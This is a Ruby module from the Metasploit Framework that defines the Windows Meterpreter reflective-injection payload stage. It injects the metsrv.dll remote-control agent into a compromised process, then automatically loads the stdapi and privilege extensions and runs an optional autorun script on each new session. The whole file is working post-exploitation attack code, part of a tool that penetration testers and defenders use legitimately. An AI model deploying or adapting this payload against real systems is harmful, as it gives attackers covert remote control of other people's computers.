##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/windows/reflectivedllinject'
require 'msf/base/sessions/meterpreter'


###
#
# Injects the meterpreter server DLL via the Reflective Dll Injection payload
#
###
module Metasploit3

	include Msf::Payload::Windows::ReflectiveDllInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Meterpreter (Reflective Injection)',
			'Version'       => '$Revision$',
			'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload',
			'Author'        => ['skape','Stephen Fewer <info@harmonysecurity.com>'],
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter))

		# Set advanced options
		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi',
					[
						true,
						"Automatically load the Stdapi extension",
						true
					]),
				OptString.new('AutoRunScript', [false, "Script to autorun on meterpreter session creation", ''])
			], self.class)

		# Don't let people set the library name option
		options.remove_option('LibraryName')
		options.remove_option('DLL')
	end

	def library_path
		File.join(Msf::Config.install_root, "data", "meterpreter", "metsrv.dll")
	end

	#
	# Once a session is created, automatically load the stdapi extension if the
	# advanced option is set to true.
	#
	def on_session(session)
		super
		if (datastore['AutoLoadStdapi'] == true)
			session.load_stdapi 
			if (framework.exploits.create(session.via_exploit).privileged?)
				session.load_priv 
			end
		end
		if (datastore['AutoRunScript'].empty? == false)
			session.execute_script(datastore['AutoRunScript'], binding)
		end
	end

end
